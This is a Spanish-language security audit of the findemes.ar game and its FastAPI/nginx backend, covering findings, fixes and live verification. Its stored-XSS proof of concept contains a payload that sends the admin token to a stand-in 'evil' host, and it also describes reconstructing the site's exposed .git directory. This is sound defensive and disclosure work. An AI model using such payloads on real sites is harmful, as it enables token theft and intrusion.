---
date: 2026-06-15
type: security-audit
tags: [findemes, seguridad, pentest, kiosco-argento]
status: remediado-deployado
---

# Auditoría de seguridad — FIN DE MES / findemes.ar

> **DEPLOYADO 2026-06-15.** Fixes #1 (XSS admin), #2 (.git), #3 (headers) en producción y verificados en vivo. #4 documentado (no se cambió scoring). #5 ya estaba OK (env seteado). Detalle al pie.

Pentest + revisión de código del juego (client-side estático) y su backend
anónimo (FastAPI + SQLite detrás de nginx + Cloudflare). Fecha: 2026-06-15.
Alcance: `findemes.ar`, `/api/*`, `admin.html`, `server/findemes_api.py`, JS del juego.

## Resumen ejecutivo
Postura general **sólida para un juego viral anónimo**: SQL parametrizado (sin SQLi),
admin con comparación en tiempo constante y *fail-closed*, nicks saneados, IP hasheada,
sin secrets en el repo, Cloudflare adelante. Dos arreglos concretos pendientes:
un **XSS almacenado en el panel admin** (robo del token) y el **directorio `.git` expuesto**.

## Hallazgos

| # | Severidad | Hallazgo |
|---|-----------|----------|
| 1 | **ALTA** | XSS almacenado en `admin.html` vía `/api/event` (campo `en_curso`) → robo del admin token |
| 2 | MEDIA | `.git/` expuesto y descargable → disclosure de todo el código (incl. backend) + email |
| 3 | MEDIA | Sin headers de seguridad (CSP, HSTS, X-Frame-Options, X-Content-Type-Options, Referrer-Policy) |
| 4 | MEDIA | Integridad del leaderboard: scores forjables (juego 100% client-side, sin verificación server) |
| 5 | MEDIA | `IP_SALT` default `"findemes-salt"` → si no se overridea, el hash de IP es reversible (deanonimización) |
| 6 | BAJA | Sin rate-limit en `/api/player` y `/api/event` → creación ilimitada de filas (bloat/DoS) |
| 7 | BAJA | `device_id` como identidad sin secreto → spoofing, `/api/me` filtra stats ajenos, farmeo de referidos |
| 8 | BAJA | `admin.html` público + email `andres@findemes.com.ar` en `.git/config` (PII) |

### 1. XSS almacenado en panel admin (ALTA)
`/api/event` acepta `type`+`meta` de cualquiera (device_id auto-asignado, sin auth).
`admin_players` parsea el `meta` JSON de eventos `progreso` y arma `en_curso`;
`admin.html:142` renderiza `en_curso.mes` y `en_curso.pat` con `innerHTML` **sin escapar**.

PoC: `POST /api/player {id:"AAAAAAAA"}` luego `POST /api/event {id:"AAAAAAAA", type:"progreso",
meta:"{\"mes\":\"<img src=x onerror=fetch('//evil/'+localStorage['findemes-admin-tok'])>\",\"pat\":0}"}`.
Cuando el CEO abre el panel, el JS corre en el origen admin y exfiltra el token (localStorage).

Fix (doble capa):
- Backend: en `admin_players`, forzar `int(m.get("mes"))` / `int(m.get("pat"))` (descartar no-numérico).
- `admin.html`: helper `esc()` (textContent) en TODO valor interpolado (nick, code, hijos, en_curso.*).
- Sumar CSP (ver #3).

### 2. `.git/` expuesto (MEDIA)
`/.git/config`, `/.git/HEAD`, `/.git/index`, `/.git/logs/HEAD` devuelven contenido real
(dirlisting 403, pero los archivos se bajan → `git-dumper` reconstruye todo el repo,
incluido `server/findemes_api.py`). `.env` y el `.py` directo NO están expuestos (fallback a index.html).
Fix: `rm -rf` del `.git` del webroot (deployar con `rsync --exclude=.git`) + bloque nginx
`location ~ /\.(git|env|hg|svn) { deny all; return 404; }`.

### 3. Headers de seguridad (MEDIA)
Ninguno presente. Agregar en nginx: HSTS, `X-Content-Type-Options nosniff`, `X-Frame-Options DENY`
(o `frame-ancestors 'none'`), `Referrer-Policy strict-origin-when-cross-origin`, y CSP.
Nota: `admin.html` usa `onclick=` inline → CSP estricta lo rompe; refactorizar a addEventListener
o proteger `admin.html` por IP/basic-auth en nginx.

### 4. Integridad del leaderboard (MEDIA)
Cualquiera puede `POST /api/score` con patrimonio hasta 150k y meses hasta 24 y entrar al top;
la telemetría (`stats`) también es forjable. Mitigado por los bounds (`TECHO_PATRIMONIO`, anti-flood),
pero gameable dentro del techo. Para un juego gratis es tolerable; endurecer con chequeo de
plausibilidad `duracion` vs `meses` (mínimo de segundos por mes), o HMAC de run con nonce de servidor.

### 5. `IP_SALT` reversible (MEDIA) — VERIFICAR EN VPS
Si `FINDEMES_IP_SALT` no está seteado en el entorno, el default conocido permite precomputar
`sha256(ip+salt)` para todo IPv4 → revertir el hash. Confirmar que está seteado con valor random largo.

### 6–8 (BAJA)
- Rate-limit nginx `limit_req` en `/api/`; o límite por `ip_hash` en creación de player/event.
- `device_id` sin secreto: aceptable para juego anónimo; si se quiere integridad, emitir token firmado.
- Mover `admin.html` detrás de auth/IP; el email en `.git` se resuelve con #2.

## Lo que está BIEN
SQL 100% parametrizado · `secrets.compare_digest` + fail-closed en token vacío ·
nick saneado (sin bypass XSS encontrado) · IP hasheada (privacy-conscious) · sin secrets en repo ·
bounds de score sensatos · docs FastAPI deshabilitados · Cloudflare adelante.

## Prioridad de acción
1. Tapar `.git` (5 min, nginx) — #2
2. Escapar `admin.html` + coerción int en backend — #1
3. Headers de seguridad en nginx — #3
4. Verificar `FINDEMES_IP_SALT` y largo del `FINDEMES_ADMIN_TOKEN` en `/etc/` — #5

## Deploy de remediación — 2026-06-15

### Infra (VPS 76.13.228.77)
- Webroot: `/var/www/kiosco` · Backend: `/opt/findemes/findemes_api.py` (systemd `findemes-api.service`, uvicorn `127.0.0.1:8099`)
- Env: `/etc/findemes.env` (`FINDEMES_ADMIN_TOKEN` len 48, `FINDEMES_IP_SALT` len 32 — NO default, **#5 ya OK**)
- vhost: `/etc/nginx/sites-available/findemes-ar` (sirve findemes.ar + www). `findemes` = solo 301 a .ar.
- Backups pre-fix: `/root/findemes-backups/` + `*.bak.presec`.

### Cambios aplicados
- **#1 XSS admin** — `admin.html`: helper `esc()` en toda interpolación a innerHTML. `findemes_api.py`: `_safe_int()` coerce `en_curso.mes/pat/dur` a int + `modo` saneado. Extra: charset en `PlayerIn/ScoreIn/EventIn/me.id` (`^[A-Za-z0-9_-]+$`) → cierra el vector `substr(id,1,6)` en origen. Defensa en profundidad en el cliente: `esc()` en `js/ui.js` (leaderboard público + input goNick) — no era explotable (lo tapa `clean_nick`) pero queda consistente.
- **#2 .git** — `rm -rf` de `.git/.DS_Store/.gitignore` del webroot + bloque nginx `location ~ /\.(?!well-known) { deny all; return 404; }`.
- **#3 headers** — snippet `/etc/nginx/snippets/findemes-sec.conf` (CSP, HSTS, X-Frame-Options DENY, nosniff, Referrer-Policy, Permissions-Policy) incluido en server + en cada location con `add_header` propio (evita la trampa de herencia).
- **#4** — NO se tocó el scoring (riesgo de falsos positivos en jugadores legítimos). Sigue acotado por `TECHO_PATRIMONIO` + anti-flood. Solución real = simulación server-side o runs firmados.

### Verificado en vivo (vía Cloudflare)
- `.git/config`, `.git/HEAD`, `.DS_Store` → **404** · `findemes.com.ar/.git/config` → **301**
- Headers de seguridad presentes en `/` y `/admin.html` (CSP incluido)
- `/api/health` 200 · `/api/leaderboard` 200 · `/api/admin/stats` sin token → **401**
- `POST /api/player` con `id` malicioso → **422** (validación nueva activa)
- Juego carga OK · `nginx -t` exitoso · `findemes-api.service` active

### Pendiente (no bloqueante)
- Endurecer CSP de `admin.html` (externalizar el `<script>` inline → quitar `'unsafe-inline'` de `script-src` para que la CSP sí frene XSS). Hoy el XSS está cerrado por escaping+coerción, la CSP solo limita orígenes externos.
- Verificar que Cloudflare SSL esté en **Full** (no Full strict) — el origen reusa cert de `.com.ar`.
- Revisión adversarial multi-agente (5 revisores) confirmó: #1 cerrado por doble capa, sin sinks residuales, nginx correcto, sin regresiones.
